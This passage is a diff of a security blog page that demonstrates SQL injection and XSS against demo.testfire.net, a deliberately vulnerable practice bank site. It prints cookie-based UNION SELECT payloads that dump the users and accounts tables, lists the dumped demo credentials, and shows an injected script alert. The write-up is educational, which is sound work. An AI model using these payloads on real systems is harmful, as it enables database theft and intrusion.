+amUserInfo=UserName=YWRtaW4=&amp;Password;=YWRtaW4=; amUserId=2 union select accountid, acct_type from accounts;--
 </pre>
-
-<p><a href="http://static.dornea.nu/img/2013/89e21aed3343e3512a8eb6267ea8b7bf.png" title="attachment:main_sql_injection2.png"><img title="attachment:main_sql_injection2.png" alt="SQL Injection" src="http://static.dornea.nu/img/2013/89e21aed3343e3512a8eb6267ea8b7bf.png" width="NaN" height="578" /></a></p>
+<p><a href="http://static.dornea.nu/img/2013/89e21aed3343e3512a8eb6267ea8b7bf.png" title="attachment:main_sql_injection2.png"><img alt="SQL Injection" class="img-responsive" height="578" src="http://static.dornea.nu/img/2013/89e21aed3343e3512a8eb6267ea8b7bf.png" title="attachment:main_sql_injection2.png" width="NaN"/></a></p>
 <p>You could use this vulnerability toÂ <strong>dump theÂ <em>users</em>Â table</strong>:</p>
 <pre>GET /bank/main.aspx HTTP/1.1
 Host: demo.testfire.net
 ...
-amUserInfo=UserName=YWRtaW4=&Password=YWRtaW4=; amUserId=2 union select username, password from users;--
+amUserInfo=UserName=YWRtaW4=&amp;Password;=YWRtaW4=; amUserId=2 union select username, password from users;--
 </pre>
-
 <p>This will return:</p>
 <pre>admin admin
 cclay Ali
@@ -2261,29 +2238,27 @@ sjoe frazier
 sspeed Demo1234
 tuser tuser
 </pre>
-
-<p>Simple, isn&#8217;t it? <img src="http://dornea.nu/wp-includes/images/smilies/icon_biggrin.gif" alt=":-D" class="wp-smiley" /> </p>
-<p>&nbsp;</p>
+<p>Simple, isn’t it? <img alt=":-D" class="wp-smiley img-responsive" src="http://dornea.nu/wp-includes/images/smilies/icon_biggrin.gif"/> </p>
+<p> </p>
 <h3 id="XSS_using_cookie_data"><span id="XSS_using_cookie_data">XSS using cookie data</span></h3>
 <p>Alternatively you could combine SQLi with XSS:</p>
 <pre>#!highlight html 
 GET /bank/main.aspx HTTP/1.1
 Host: demo.testfire.net
 ...
-amUserInfo=UserName=YWRtaW4=&Password=YWRtaW4=; amUserId=2 union select "&lt;script&gt;alert(1234)&lt;/script&gt;", "Injection FOUND!" from accounts;--
+amUserInfo=UserName=YWRtaW4=&amp;Password;=YWRtaW4=; amUserId=2 union select "&lt;script&gt;alert(1234)&lt;/script&gt;", "Injection FOUND!" from accounts;--
 </pre>
-
-<p><a href="http://static.dornea.nu/img/2013/fe65a05f2bc5e5ec889f64f81e9f007e.png" title="attachment:main_sql_injection_with_xss.png"><img title="attachment:main_sql_injection_with_xss.png" alt="SQL Injection" src="http://static.dornea.nu/img/2013/fe65a05f2bc5e5ec889f64f81e9f007e.png" width="NaN" height="581" /></a></p>
+<p><a href="http://static.dornea.nu/img/2013/fe65a05f2bc5e5ec889f64f81e9f007e.png" title="attachment:main_sql_injection_with_xss.png"><img alt="SQL Injection" class="img-responsive" height="581" src="http://static.dornea.nu/img/2013/fe65a05f2bc5e5ec889f64f81e9f007e.png" title="attachment:main_sql_injection_with_xss.png" width="NaN"/></a></p>
             </div>
             <!-- /.entry-content -->
 <section class="well" id="related-posts">
     <h4>Related Posts:</h4>
     <ul>
         <li><a href="http://blog.dornea.nu/2014/06/02/googles-xss-game-solutions">Googles XSS Game - Solutions</a></li>
-        <li><a href="http://blog.dornea.nu/2014/07/07/disect-android-apks-like-a-pro-static-code-analysis">Disect Android APKs like a Pro - Static code analysis</a></li>
-        <li><a href="http://blog.dornea.nu/2013/08/02/howto-automate-burp-using-burp-extender-api">HowTo: Automate Burp using Burp Extender API</a></li>
-        <li><a href="http://blog.dornea.nu/2015/06/03/usd-ag-hacker-day-in-hamburg">usd AG Hacker Day in Hamburg</a></li>
         <li><a href="http://blog.dornea.nu/2014/01/23/24h-android-sniffing-using-tcpdump-ipython-notebook-version">24h Android sniffing using tcpdump - IPython Notebook Version</a></li>
+        <li><a href="http://blog.dornea.nu/2015/07/01/debugging-android-native-shared-libraries">Debugging Android native shared libraries</a></li>
+        <li><a href="http://blog.dornea.nu/2013/08/02/howto-automate-burp-using-burp-extender-api">HowTo: Automate Burp using Burp Extender API</a></li>
+        <li><a href="http://blog.dornea.nu/2014/08/05/android-dynamic-code-analysis-mastering-droidbox">Android Dynamic Code Analysis - Mastering DroidBox</a></li>
     </ul>
 </section>
     <hr />
